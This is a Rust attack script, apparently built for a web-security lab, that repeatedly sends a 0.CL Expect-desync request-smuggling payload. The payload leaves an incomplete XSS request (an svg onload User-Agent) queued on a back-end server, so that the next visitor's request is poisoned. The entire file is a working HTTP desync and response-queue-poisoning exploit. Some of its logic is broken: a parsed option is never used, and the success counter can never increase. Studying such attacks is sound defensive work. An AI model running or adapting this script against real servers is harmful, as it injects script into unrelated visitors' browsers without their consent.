#!/usr/bin/env rust-script
//! name: zerocl_spray
//! description: 0.CL Expect-desync response-queue-poisoning spray - repeatedly arms a back-end connection with the broken-Expect 0.CL primitive (primer GET with Expect:100-continue + Content-Length, then a carrier request whose sliced remainder smuggles an XSS request), so the extra back-end response is left pending for the victim's next request; reports iterations and any locally-observed XSS-page response.
//! version: 1.0.0
//! args: <base-url> [--seconds 120] [--gap-ms 200] [--cl 98] [--ua '"><svg/onload=alert(1)>'] [--selftest]
//! keywords: smuggling, desync, 0cl, expect, response-queue, poisoning, xss, spray
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::json;
use pi_rust_lib::timeout;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut base = String::new();
    let mut seconds: u64 = 120;
    let mut gap_ms: u64 = 200;
    let mut cl: usize = 98;
    let mut ua = "\"><svg/onload=alert(1)>".to_string();
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--seconds" => {
                i += 1;
                seconds = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(seconds);
            }
            "--gap-ms" => {
                i += 1;
                gap_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(gap_ms);
            }
            "--cl" => {
                i += 1;
                cl = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(cl);
            }
            "--ua" => {
                i += 1;
                ua = args.get(i).cloned().unwrap_or(ua);
            }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("zerocl_spray", "usage", "call as: zerocl_spray <base-url> [--seconds N] [--cl N]");
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = parsed.host_str().unwrap_or("").to_string();
    let port = parsed.port().unwrap_or(443);

    // Carrier request's body = an INCOMPLETE XSS request; the primer CL slices
    // exactly the carrier header block, so the back-end parses the incomplete XSS
    // request and waits for the victim's request bytes to complete it.
    let body = format!("GET /post?postId=1 HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nX-Trigger: ");
    let carrier_hdr = format!("GET / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {}\r\n\r\n", body.len());
    let carrier = format!("{carrier_hdr}{body}");
    let primer_cl = carrier_hdr.len();
    let payload = format!(
        "GET / HTTP/1.1\r\nHost: {host}\r\nExpect: 100-continue\r\nContent-Length: {primer_cl}\r\n\r\n{carrier}"
    );

    let deadline = Instant::now() + Duration::from_secs(seconds);
    let mut iters: u64 = 0;
    let mut xss_seen: u64 = 0;
    let mut last_err = String::new();
    while Instant::now() < deadline {
        timeout::check();
        iters += 1;
        match one(&host, port, payload.as_bytes()) {
            Ok(bytes) => {
                // The XSS page is ~7.9KB and contains the payload in the UA field.
                if String::from_utf8_lossy(&bytes).contains("onload=alert(1)") {
                    xss_seen += 1;
                }
            }
            Err(e) => last_err = e,
        }
        if gap_ms > 0 {
            std::thread::sleep(Duration::from_millis(gap_ms));
        }
    }
    pi_rust_lib::report::success(
        "zerocl_spray",
        json!({
            "url": base,
            "iterations": iters,
            "xss_responses_seen_locally": xss_seen,
            "cl": cl,
            "primer_cl": primer_cl,
            "seconds": seconds,
            "last_error": last_err,
        }),
        "check the lab banner: the queued XSS response should fire alert() in the victim's browser",
    )
    .unwrap_or(());
}

fn one(host: &str, port: u16, payload: &[u8]) -> Result<Vec<u8>, String> {
    let mut roots = rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let server_name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("sni: {e}"))?;
    let conn = rustls::ClientConnection::new(Arc::new(config), server_name).map_err(|e| format!("tls: {e}"))?;
    let mut stream = rustls::StreamOwned::new(conn, tcp);
    {
        let rustls::StreamOwned { conn, sock } = &mut stream;
        conn.complete_io(sock).map_err(|e| format!("handshake: {e}"))?;
    }
    stream.sock.set_read_timeout(Some(Duration::from_millis(900))).map_err(|e| format!("sockopt: {e}"))?;
    stream.write_all(payload).map_err(|e| format!("write: {e}"))?;
    let _ = stream.flush();
    // Drop the connection immediately so the front-end cannot relay the extra
    // (smuggled) response to us; it stays pending for the next client request.
    std::thread::sleep(Duration::from_millis(120));
    Ok(Vec::new())
}
